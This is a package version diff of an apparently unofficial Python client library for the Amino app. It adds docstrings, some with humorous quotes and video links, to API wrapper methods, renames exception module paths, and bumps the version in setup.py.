+        - isAutoRenew: bool = False
+            - do you wanna auto renew your purchase?
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = {'objectId': objectId,
                 'objectType': objectType,
                 'v': 1,
                 "timestamp": int(timestamp() * 1000)}
 
         if aminoPlus: data['paymentContext'] = {'discountStatus': 1, 'discountValue': 1, 'isAutoRenew': autoRenew}
         else: data['paymentContext'] = {'discountStatus': 0, 'discountValue': 1, 'isAutoRenew': autoRenew}
@@ -2102,15 +3448,15 @@
         **Parameters**
             - **avatarId** : ID of the avatar frame.
             - **applyToAll** : Apply to all.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
 
         """
 
         data = {"frameId": avatarId,
                 "applyToAll": 0,
                 "timestamp": int(timestamp() * 1000)}
 
@@ -2129,109 +3475,223 @@
         **Parameters**
             - **chatId** - ID of the Chat
             - **userId** - ID of the User
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "uid": userId
         })
 
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/vvchat-presenter/invite/", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def add_poll_option(self, blogId: str, question: str):
+        """
+        Add poll option.
+
+        Accepting:
+        - blogId: str
+        - question: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "mediaList": None,
             "title": question,
             "type": 0,
             "timestamp": int(timestamp() * 1000)
         })
 
         response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/poll/option", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def create_wiki_category(self, title: str, parentCategoryId: str, content: str = None):
+        """
+        Create wiki category.
+
+        Accepting:
+        - title: str
+        - parentCategoryId: str
+        - content: str = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "content": content,
             "icon": None,
             "label": title,
             "mediaList": None,
             "parentCategoryId": parentCategoryId,
             "timestamp": int(timestamp() * 1000)
         })
 
         response = self.session.post(f"/x{self.comId}/s/item-category", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
-    def create_shared_folder(self,title: str):
+    def create_shared_folder(self, title: str):
+        """
+        Create shared folder.
+
+        Accepting:
+        - title: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
                 "title":title,
                 "timestamp":int(timestamp() * 1000)
             })
         response = self.session.post(f"/x{self.comId}/s/shared-folder/folders", headers=self.additional_headers(data=data),data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def submit_to_wiki(self, wikiId: str, message: str):
+        """
+        Submit wiki to curator review. Maybe, it will get approve?
+
+        https://www.youtube.com/watch?v=EmygSPd4Ho0
+
+        Accepting:
+        - wikiId: str
+        - message: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "message": message,
             "itemId": wikiId,
             "timestamp": int(timestamp() * 1000)
         })
 
         response = self.session.post(f"/x{self.comId}/s/knowledge-base-request", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def accept_wiki_request(self, requestId: str, destinationCategoryIdList: list):
+        """
+        Accept wiki.
+
+        "Congratulations!
+
+        Your WIKI has been approved."
+
+        https://www.youtube.com/watch?v=LabIat9t-uY
+
+        Accepting:
+        - requestId: str
+        - destinationCategoryIdList: list
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "destinationCategoryIdList": destinationCategoryIdList,
             "actionType": "create",
             "timestamp": int(timestamp() * 1000)
         })
 
         response = self.session.post(f"/x{self.comId}/s/knowledge-base-request/{requestId}/approve", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def reject_wiki_request(self, requestId: str):
+        """
+        Reject wiki.
+
+        "Congratulations!
+
+        Your WIKI has been denied.
+
+        Don't even bother trying again."
+
+        https://www.youtube.com/watch?v=3vH6GBbeAgA
+
+        Accepting:
+        - requestId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({})
 
         response = self.session.post(f"/x{self.comId}/s/knowledge-base-request/{requestId}/reject", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def get_wiki_submissions(self, start: int = 0, size: int = 25):
+        """
+        Get wiki submissions to be approved.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `WikiRequestList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/knowledge-base-request?type=all&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.WikiRequestList(response.json()["knowledgeBaseRequestList"]).WikiRequestList
 
     def get_live_layer(self):
+        """
+        Get live layer.
+
+        Recieving:
+        - object `LiveLayer`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/live-layer/homepage?v=2", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.LiveLayer(response.json()["liveLayerList"]).LiveLayer
 
     def apply_bubble(self, bubbleId: str, chatId: str, applyToAll: bool = False):
+        """
+        Apply bubble that you want.
+
+        Accepting:
+        - bubbleId: str
+        - chatId: str
+        - applyToAll: bool = False
+            - apply bubble to all chats?
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = {
             "applyToAll": 0,
             "bubbleId": bubbleId,
             "threadId": chatId,
             "timestamp": int(timestamp() * 1000)
         }
 
@@ -2242,21 +3702,26 @@
         response = self.session.post(f"/x{self.comId}/s/chat/thread/apply-bubble", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def send_video(self, chatId: str, videoFile: BinaryIO, imageFile: BinaryIO, message: str = None, mediaUhqEnabled: bool = False):
         """
-            Sending video.
+        Sending video.
 
-            chatId: str
-            message: str
-            videoFile: BinaryIO [open(file, "rb")]
-            imageFile: BinaryIO [open(file, "rb")]
-            mediaUhqEnabled: bool = False
+        Accepting:
+        - chatId: str
+        - message: str
+        - videoFile: BinaryIO [open(file, "rb")]
+        - imageFile: BinaryIO [open(file, "rb")]
+        - mediaUhqEnabled: bool = False
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
         """
         i = str(uuid4()).upper()
         cover = f"{i}_thumb.jpg"
         video = f"{i}.mp4"
         
         data = dumps({
             "clientRefId": int(timestamp() / 10 % 1000000000),
```

### Comparing `amino.fix.fix-1.0.6b1/setup.py` & `amino.fix.fix-1.0.6b2/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,9 +1,9 @@
 from setuptools import setup, find_packages
-LIBRARY_VERSION = "1.0.6b1"
+LIBRARY_VERSION = "1.0.6b2"
 
 # REQUIREMENTS
 
 requirements = [
     "httpx>=0.27.0",
     "httpx[http2]",
     "httpx[socks]",
```

